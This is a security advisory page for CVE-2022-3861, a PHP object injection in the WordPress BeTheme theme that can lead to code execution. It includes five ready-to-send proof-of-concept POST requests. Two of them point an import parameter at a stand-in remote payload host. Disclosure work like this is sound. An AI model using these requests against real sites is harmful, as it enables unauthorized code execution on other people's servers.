---
title: WordPress BeTheme 26.5.1.4 PHP Object Injection
url: https://cxsecurity.com/issue/WLB-2022110040
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2022-11-23
fetch_date: 2025-10-03T23:26:39.305509
---

# WordPress BeTheme 26.5.1.4 PHP Object Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WordPress BeTheme 26.5.1.4 PHP Object Injection** **2022.11.22**  Credit:  **[Julien Ahrens](https://cxsecurity.com/author/Julien%2BAhrens/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2022-3861](https://cxsecurity.com/cveshow/CVE-2022-3861/ "Click to see CVE-2022-3861")**  CWE: **[CWE-502](https://cxsecurity.com/cwe/CWE-502 "Click to see CWE-502")** | |

RCE Security Advisory
https://www.rcesecurity.com
1. ADVISORY INFORMATION
=======================
Product: Betheme
Vendor URL: https://muffingroup.com/betheme/
Type: Deserialization of Untrusted Data [CWE-502]
Date found: 2022-11-02
Date published: 2022-11-18
CVSSv3 Score: 8.8 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
CVE: CVE-2022-3861
2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.
3. VERSIONS AFFECTED
====================
BeTheme 26.5.1.4 and below
4. INTRODUCTION
===============
Ever since Betheme was just an idea, we knew that it would be different from all
other multipurpose WordPress themes we’d tried before.
We wanted to build something more than just another WordPress theme, that could
easily adapt to any project you need to work on without writing any code. A theme
designed from scratch to save your time & help you enjoy your freedom...
(from the vendor's homepage)
5. VULNERABILITY DETAILS
========================
The WordPress theme is vulnerable to multiple PHP Object injections when processing
input to multiple, privileged Wordpress ajax routes:
-mfn\_builder\_import -> "mfn-items-import" parameter
-mfn\_builder\_import\_page -> "mfn-items-import-page" parameter
-importdata -> "import" parameter
-importsinglepage -> "import" parameter
-importfromclipboard -> "import" parameter
To successfully exploit this vulnerability, an attacker must be authenticated with at
least Wordpress "Contributer" rights.
Successful exploits can allow the attacker to execute arbitrary code.
6. PROOF OF CONCEPT
===================
To exploit the "mfn\_builder\_import" ajax action, use:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 75
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [your-auth-cookies]
Connection: close
mfn-builder-nonce=[your-nonce]&action=mfn\_builder\_import&mfn-items-import=Tzo4OiJzdGRDbGFzcyI6MTp7czozOiJyY2UiO3M6ODoic2VjdXJpdHkiO30=
To exploit the "mfn\_builder\_import\_page" ajax action, use:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 123
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [your-auth-cookies]
Connection: close
mfn-builder-nonce=[your-nonce]&action=mfn\_builder\_import\_page&mfn-items-import-page=https://your-remote-payload.com/
To exploit the "importdata" ajax action, use:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 114
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [your-auth-cookies]
Connection: close
mfn-builder-nonce=[your-nonce]&action=importdata&import=Tzo4OiJzdGRDbGFzcyI6MTp7czozOiJyY2UiO3M6ODoic2VjdXJpdHkiO30=
To exploit the "importsinglepage" ajax action, use:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 83
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [your-auth-cookies]
Connection: close
mfn-builder-nonce=[your-nonce]&action=importsinglepage&import=https://your-remote-payload.com/
To exploit the "importfromclipboard" ajax action, use:
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost
Content-Length: 123
Accept: \*/\*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10\_15\_7)
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: [your-auth-cookies]
Connection: close
mfn-builder-nonce=[your-nonce]&action=importfromclipboard&import=Tzo4OiJzdGRDbGFzcyI6MTp7czozOiJyY2UiO3M6ODoic2VjdXJpdHkiO30=
7. SOLUTION
===========
Update to version 26.6
8. REPORT TIMELINE
==================
2022-11-01: Discovery of the vulnerability
2022-11-03: CVE requested from Wordfence (CNA)
2022-11-04: Wordfence assigns CVE-2022-3861
2022-11-08: Vendor notification
2022-11-08: Opened up a security support case on envato.com since the vendor usually doesn't respond
2022-11-16: Envato responds stating that the vendor released 26.6 which fixes this vulnerability
2022-11-18: Public disclosure
9. REFERENCES
=============
https://github.com/MrTuxracer/advisories

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2022110040)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top